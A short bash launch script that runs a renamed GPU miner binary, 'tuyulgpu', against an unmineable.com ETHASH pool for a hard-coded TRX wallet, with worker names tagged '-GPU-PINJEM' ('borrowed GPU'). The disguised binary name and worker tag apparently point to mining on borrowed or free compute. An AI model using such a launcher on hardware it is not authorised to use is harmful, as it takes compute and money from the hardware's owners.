#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
